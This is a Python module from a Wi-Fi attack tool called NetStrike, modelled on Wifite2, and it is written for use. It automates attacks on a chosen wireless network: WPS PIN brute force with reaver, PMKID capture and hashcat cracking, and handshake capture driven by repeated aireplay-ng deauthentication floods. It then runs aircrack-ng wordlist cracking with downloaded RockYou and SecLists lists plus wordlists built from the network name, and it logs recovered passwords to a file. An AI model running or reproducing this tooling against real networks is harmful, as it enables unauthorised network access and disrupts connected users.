#!/usr/bin/env python3

import os
import time
import subprocess
import threading
import requests

class PasswordCracker:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.cracking_active = False
        self.wordlists = {}

    def auto_crack_attack(self):
        """Wifite2-style auto cracking with multiple methods"""
        print("\033[1;36m[→] Initializing Wifite2-style auto cracking...\033[0m")
        
        # Always perform fresh scan (Wifite2 behavior)
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;33m[🎯] Target acquired: {target['essid']}\033[0m")
                print("\033[1;36m[⚡] Starting Wifite2-style cracking sequence...\033[0m")
                
                # Try Wifite2-style cracking methods
                if self.wifite2_cracking_sequence(target):
                    return
                
                print("\033[1;31m[✘] All cracking methods failed\033[0m")
                print("\033[1;33m[💡] Try with different wordlists or manual methods\033[0m")

    def wifite2_cracking_sequence(self, target):
        """Wifite2-style cracking sequence with multiple methods"""
        methods = [
            ("WPS PIN Attack", self.wifite2_wps_attack),
            ("PMKID Capture", self.wifite2_pmkid_attack),
            ("Handshake Capture", self.wifite2_handshake_attack),
            ("Wordlist Attack", self.wifite2_wordlist_attack)
        ]
        
        for method_name, method_func in methods:
            print(f"\033[1;36m[→] Attempting: {method_name}\033[0m")
            
            result = method_func(target)
            
            if result:
                print(f"\033[1;32m[🎉] Success with {method_name}!\033[0m")
                return True
            else:
                print(f"\033[1;33m[⚠️] {method_name} failed - Trying next method\033[0m")
                time.sleep(2)
        
        return False

    def wifite2_wps_attack(self, target):
        """Wifite2-style WPS attack"""
        print("\033[1;33m[!] Checking WPS vulnerability...\033[0m")
        
        # Check if WPS is available using wash
        wash_cmd = f"timeout 30s wash -i {self.core.mon_interface} -s"
        result = self.core.run_command(wash_cmd)
        
        if result and target['bssid'] in result.stdout:
            print("\033[1;32m[✓] WPS vulnerability detected\033[0m")
            print("\033[1;31m[💣] Launching WPS PIN brute force...\033[0m")
            
            # Start reaver with Wifite2-style parameters
            reaver_proc = self.core.run_command(
                f"reaver -i {self.core.mon_interface} -b {target['bssid']} -c {target['channel']} -vv -K 1 -N -A -d 2 -t 2 -T 2",
                background=True
            )
            
            if reaver_proc:
                print("\033[1;32m[⚡] WPS attack running in background\033[0m")
                print("\033[1;33m[!] Check terminal for PIN progress\033[0m")
                return True
        else:
            print("\033[1;31m[✘] WPS not available on target\033[0m")
        
        return False

    def wifite2_pmkid_attack(self, target):
        """Wifite2-style PMKID attack"""
        print("\033[1;33m[!] Attempting PMKID capture...\033[0m")
        
        pmkid_file = f"/tmp/netstrike_pmkid_{target['bssid'].replace(':', '')}"
        
        # Use hcxdumptool for PMKID capture (Wifite2 method)
        capture_cmd = f"timeout 60s hcxdumptool -i {self.core.mon_interface} -o {pmkid_file}.pcapng --filterlist={target['bssid']} --filtermode=2 --enable_status=1"
        result = self.core.run_command(capture_cmd)
        
        if os.path.exists(f"{pmkid_file}.pcapng") and os.path.getsize(f"{pmkid_file}.pcapng") > 100:
            print("\033[1;32m[✓] PMKID captured successfully\033[0m")
            
            # Convert to hash format
            convert_cmd = f"hcxpcaptool -z {pmkid_file}.hash {pmkid_file}.pcapng"
            self.core.run_command(convert_cmd)
            
            if os.path.exists(f"{pmkid_file}.hash"):
                return self.wifite2_crack_pmkid(f"{pmkid_file}.hash", target)
        
        print("\033[1;31m[✘] PMKID capture failed\033[0m")
        return False

    def wifite2_crack_pmkid(self, hash_file, target):
        """Wifite2-style PMKID cracking with multiple wordlists"""
        print("\033[1;36m[→] Cracking PMKID with Wifite2 wordlist strategy...\033[0m")
        
        # Get Wifite2-style wordlists
        wordlists = self.get_wifite2_wordlists()
        
        for wl_name, wl_path in wordlists.items():
            if wl_path and os.path.exists(wl_path):
                print(f"\033[1;36m[→] Trying {wl_name}...\033[0m")
                
                # Use hashcat for PMKID cracking
                crack_cmd = f"hashcat -m 16800 {hash_file} {wl_path} -O --force -w 3"
                result = self.core.run_command(crack_cmd, timeout=300)
                
                if result and "Cracked" in result.stdout:
                    print("\033[1;32m[🎉] PMKID cracked successfully!\033[0m")
                    # Extract password
                    lines = result.stdout.split('\n')
                    for line in lines:
                        if "Cracked" in line and ":" in line:
                            password = line.split(':')[-1].strip()
                            print(f"\033[1;32m[🔓] PASSWORD FOUND: {password}\033[0m")
                            self.save_cracked_password(target, password)
                            return True
        
        return False

    def wifite2_handshake_attack(self, target):
        """Wifite2-style handshake capture and cracking"""
        print("\033[1;33m[!] Attempting handshake capture...\033[0m")
        
        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}"
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        # Start capture with airodump-ng
        print("\033[1;36m[→] Capturing for 60 seconds...\033[0m")
        capture_proc = self.core.run_command(
            f"airodump-ng -c {target['channel']} --bssid {target['bssid']} -w {cap_file} {self.core.mon_interface} --output-format cap",
            background=True
        )
        
        # Enhanced deauth attacks
        print("\033[1;31m[💣] Deploying deauth attacks...\033[0m")
        deauth_thread = threading.Thread(target=self.wifite2_deauth_attack, args=(target,))
        deauth_thread.daemon = True
        deauth_thread.start()
        
        # Monitor for handshake
        handshake_captured = False
        start_time = time.time()
        while time.time() - start_time < 60 and not handshake_captured:
            if self.check_handshake(f"{cap_file}-01.cap"):
                handshake_captured = True
                break
            time.sleep(5)
        
        if capture_proc:
            capture_proc.terminate()
        
        if handshake_captured:
            print("\033[1;32m[✓] Handshake captured successfully!\033[0m")
            return self.wifite2_crack_handshake(f"{cap_file}-01.cap", target)
        else:
            print("\033[1;31m[✘] No handshake captured\033[0m")
            return False

    def wifite2_deauth_attack(self, target):
        """Wifite2-style deauth attacks"""
        for i in range(20):
            if self.cracking_active:
                break
            self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} >/dev/null 2>&1")
            time.sleep(1.5)

    def wifite2_crack_handshake(self, cap_file, target):
        """Wifite2-style handshake cracking with multiple wordlists"""
        print("\033[1;36m[→] Cracking handshake with Wifite2 strategy...\033[0m")
        
        # Get Wifite2-style wordlists
        wordlists = self.get_wifite2_wordlists()
        
        for wl_name, wl_path in wordlists.items():
            if wl_path and os.path.exists(wl_path):
                print(f"\033[1;36m[→] Trying {wl_name}...\033[0m")
                
                # Use aircrack-ng for handshake cracking
                result = self.core.run_command(
                    f"aircrack-ng -w {wl_path} -b {target['bssid']} {cap_file} -l /tmp/cracked.txt -q",
                    timeout=600
                )
                
                if os.path.exists("/tmp/cracked.txt"):
                    with open("/tmp/cracked.txt", 'r') as f:
                        password = f.read().strip()
                    print(f"\033[1;32m[🎉] PASSWORD CRACKED: {password}\033[0m")
                    self.save_cracked_password(target, password)
                    return True
        
        return False

    def wifite2_wordlist_attack(self, target):
        """Wifite2-style wordlist attack with existing captures"""
        print("\033[1;33m[!] Checking for existing captures...\033[0m")
        
        # Check for existing handshake
        cap_file = f"/tmp/netstrike_handshake_{target['bssid'].replace(':', '_')}-01.cap"
        if not os.path.exists(cap_file):
            print("\033[1;31m[✘] No handshake file found\033[0m")
            return False
        
        return self.wifite2_crack_handshake(cap_file, target)

    def get_wifite2_wordlists(self):
        """Get Wifite2-style wordlist priority"""
        if not self.wordlists:
            self.wordlists = {
                "RockYou": self.download_wordlist_rockyou(),
                "Top Million": self.download_wordlist_top_million(),
                "Common Passwords": self.create_common_wordlist(),
                "Targeted Wordlist": self.create_targeted_wordlist()
            }
        return self.wordlists

    def download_wordlist_rockyou(self):
        """Download RockYou wordlist (Wifite2 default)"""
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        
        if os.path.exists(rockyou_path):
            return rockyou_path
        
        print("\033[1;33m[!] Downloading RockYou wordlist...\033[0m")
        
        # Try multiple sources
        sources = [
            "wget -q https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -O /tmp/rockyou.txt 2>/dev/null",
            "curl -s -L -o /tmp/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt 2>/dev/null"
        ]
        
        for source in sources:
            self.core.run_command(source)
            if os.path.exists("/tmp/rockyou.txt") and os.path.getsize("/tmp/rockyou.txt") > 1000000:
                return "/tmp/rockyou.txt"
        
        return None

    def download_wordlist_top_million(self):
        """Download top million passwords wordlist"""
        top_million_path = "/tmp/top_million.txt"
        
        if os.path.exists(top_million_path):
            return top_million_path
        
        print("\033[1;33m[!] Downloading top million wordlist...\033[0m")
        
        self.core.run_command("wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -O /tmp/top_million.txt 2>/dev/null")
        
        if os.path.exists("/tmp/top_million.txt"):
            return "/tmp/top_million.txt"
        
        return None

    def create_common_wordlist(self):
        """Create common passwords wordlist"""
        common_path = "/tmp/common_passwords.txt"
        
        if not os.path.exists(common_path):
            common_passwords = [
                "123456", "password", "12345678", "qwerty", "123456789",
                "12345", "1234", "111111", "1234567", "dragon",
                "123123", "baseball", "abc123", "football", "monkey",
                "letmein", "696969", "shadow", "master", "666666",
                "qwertyuiop", "123321", "mustang", "1234567890", "michael"
            ]
            
            try:
                with open(common_path, 'w') as f:
                    for pwd in common_passwords:
                        f.write(pwd + '\n')
            except:
                pass
        
        return common_path

    def create_targeted_wordlist(self, essid=None):
        """Create targeted wordlist based on ESSID"""
        targeted_path = "/tmp/targeted_wordlist.txt"
        
        common_passwords = [
            "12345678", "password", "admin123", "welcome", "qwerty",
            "123456789", "password123", "admin", "welcome123", "1234567890"
        ]
        
        if essid and essid != "HIDDEN_SSID":
            variations = [
                essid, essid + "123", essid + "1234", essid.lower(),
                essid.upper(), essid.replace(' ', ''), essid.replace(' ', '_')
            ]
            common_passwords.extend(variations)
        
        try:
            with open(targeted_path, 'w') as f:
                for pwd in common_passwords:
                    f.write(pwd + '\n')
            return targeted_path
        except:
            return None

    def check_handshake(self, cap_file):
        """Check if handshake was captured"""
        if not os.path.exists(cap_file):
            return False
        
        result = self.core.run_command(f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'")
        return result and "1 handshake" in result.stdout

    def save_cracked_password(self, target, password):
        """Save cracked password to file"""
        try:
            with open("/tmp/netstrike_cracked_passwords.txt", "a") as f:
                f.write(f"Network: {target['essid']} | BSSID: {target['bssid']} | Password: {password}\n")
            print(f"\033[1;32m[💾] Password saved to: /tmp/netstrike_cracked_passwords.txt\033[0m")
        except Exception as e:
            print(f"\033[1;33m[!] Could not save password: {e}\033[0m")

    def handshake_capture_menu(self):
        """Dedicated handshake capture menu"""
        print("\033[1;36m[→] Starting handshake capture session...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                return self.wifite2_handshake_attack(target)
        return False

    def wps_pin_attack(self):
        """Manual WPS PIN attack"""
        print("\033[1;33m[!] Scanning for WPS-enabled networks...\033[0m")
        
        # Perform fresh scan for WPS networks
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                return self.wifite2_wps_attack(target)
        
        return False
